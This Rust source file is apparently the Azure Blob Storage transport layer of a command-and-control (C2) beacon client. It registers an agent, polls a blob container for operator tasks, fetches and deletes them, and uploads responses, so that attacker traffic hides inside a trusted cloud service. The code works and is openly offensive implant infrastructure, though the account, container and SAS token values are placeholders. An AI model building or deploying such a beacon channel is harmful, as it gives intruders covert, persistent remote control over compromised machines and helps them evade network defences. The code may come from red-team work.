//! Azure Blob Storage transport layer for the External C2 client.
//!
//! Handles raw I/O only — no encoding/decoding.
//! Encoding is handled by the wrapper functions in `utils.rs`.

use std::time::Duration;

use reqwest::Client;
use tokio::time::sleep;
use uuid::Uuid;

// ── Configuration ───────────────────────────────────────────────────────────

/// Azure Storage account name
const AZURE_ACCOUNT_NAME: &str = "YOUR_ACCOUNT_NAME";

/// Azure Blob container name
const AZURE_CONTAINER_NAME: &str = "YOUR_CONTAINER_NAME";

/// SAS token (without leading '?')
/// Must have: Read, Add, Create, Write, Delete, List permissions on the container.
const AZURE_SAS_TOKEN: &str = "YOUR_SAS_TOKEN";

// ── Internal Azure Blob client ──────────────────────────────────────────────

#[derive(Clone)]
struct BlobClient {
    http: Client,
    base_url: String,
    sas_token: String,
}

impl BlobClient {
    fn new(
        account_name: &str,
        container_name: &str,
        sas_token: &str,
    ) -> Result<Self, Box<dyn std::error::Error>> {
        let http = Client::builder()
            .timeout(Duration::from_secs(30))
            .build()?;
        let base_url = format!(
            "https://{}.blob.core.windows.net/{}",
            account_name, container_name
        );
        Ok(Self {
            http,
            base_url,
            sas_token: sas_token.to_string(),
        })
    }

    async fn put_blob(&self, blob_name: &str, data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
        let url = format!("{}/{}?{}", self.base_url, blob_name, self.sas_token);
        let resp = self
            .http
            .put(&url)
            .header("x-ms-blob-type", "BlockBlob")
            .header("Content-Length", data.len().to_string())
            .body(data.to_vec())
            .send()
            .await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            return Err(format!("put_blob '{}' failed: HTTP {} — {}", blob_name, status, body).into());
        }
        Ok(())
    }

    async fn get_blob(&self, blob_name: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let url = format!("{}/{}?{}", self.base_url, blob_name, self.sas_token);
        let resp = self.http.get(&url).send().await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            return Err(format!("get_blob '{}' failed: HTTP {} — {}", blob_name, status, body).into());
        }
        Ok(resp.bytes().await?.to_vec())
    }

    async fn list_blobs(&self, prefix: &str) -> Result<Vec<String>, Box<dyn std::error::Error>> {
        let url = format!(
            "{}?restype=container&comp=list&prefix={}&{}",
            self.base_url,
            urlencoding::encode(prefix),
            self.sas_token
        );
        let resp = self.http.get(&url).send().await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            return Err(format!("list_blobs failed: HTTP {} — {}", status, body).into());
        }

        let body = resp.text().await?;
        let mut names = Vec::new();
        for segment in body.split("<Name>") {
            if let Some(end_idx) = segment.find("</Name>") {
                let name = &segment[..end_idx];
                if !name.is_empty() {
                    names.push(name.to_string());
                }
            }
        }
        Ok(names)
    }

    async fn delete_blob(&self, blob_name: &str) -> Result<(), Box<dyn std::error::Error>> {
        let url = format!("{}/{}?{}", self.base_url, blob_name, self.sas_token);
        let resp = self.http.delete(&url).send().await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            return Err(format!("delete_blob '{}' failed: HTTP {} — {}", blob_name, status, body).into());
        }
        Ok(())
    }
}

// ── Transport handle ────────────────────────────────────────────────────────

/// Opaque handle that holds the Azure Blob client and the key-name prefixes
/// derived from the beacon ID.
pub struct BlobTransport {
    blob: BlobClient,
    task_key_name: String,
    resp_key_name: String,
}

// ── Public API (raw I/O — no encoding) ──────────────────────────────────────

/// Register a new beacon agent with the C2 server via Azure Blob.
///
/// Writes a registration marker and returns a [`BlobTransport`] handle.
pub async fn register_beacon(beacon_id: &str) -> Result<BlobTransport, Box<dyn std::error::Error>> {
    let blob = BlobClient::new(AZURE_ACCOUNT_NAME, AZURE_CONTAINER_NAME, AZURE_SAS_TOKEN)?;

    let key_name = format!("AGENT:{beacon_id}");
    blob.put_blob(&key_name, b"").await?;
    println!("[+] blob: Registering new agent {}", key_name);

    let task_key_name = format!("{beacon_id}:TaskForYou");
    let resp_key_name = format!("{beacon_id}:RespForYou");

    Ok(BlobTransport {
        blob,
        task_key_name,
        resp_key_name,
    })
}

/// Send raw (already-encoded) data to the C2 server via Azure Blob.
pub async fn send_data(
    transport: &BlobTransport,
    data: &[u8],
) -> Result<(), Box<dyn std::error::Error>> {
    let resp_key = format!("{}:{}", transport.resp_key_name, Uuid::new_v4());
    transport.blob.put_blob(&resp_key, data).await?;
    Ok(())
}

/// Receive raw (still-encoded) data from the C2 server via Azure Blob.
///
/// Blocks (polling every 10 s) until at least one task blob appears, then
/// returns all available tasks as raw `Vec<Vec<u8>>`.
pub async fn recv_data(
    transport: &BlobTransport,
) -> Result<Vec<Vec<u8>>, Box<dyn std::error::Error>> {
    loop {
        let keys = transport.blob.list_blobs(&transport.task_key_name).await?;

        if keys.is_empty() {
            sleep(Duration::from_secs(10)).await;
            continue;
        }

        let mut tasks: Vec<Vec<u8>> = Vec::new();

        for key in keys {
            let raw = transport.blob.get_blob(&key).await?;
            transport.blob.delete_blob(&key).await?;
            tasks.push(raw);
        }

        return Ok(tasks);
    }
}
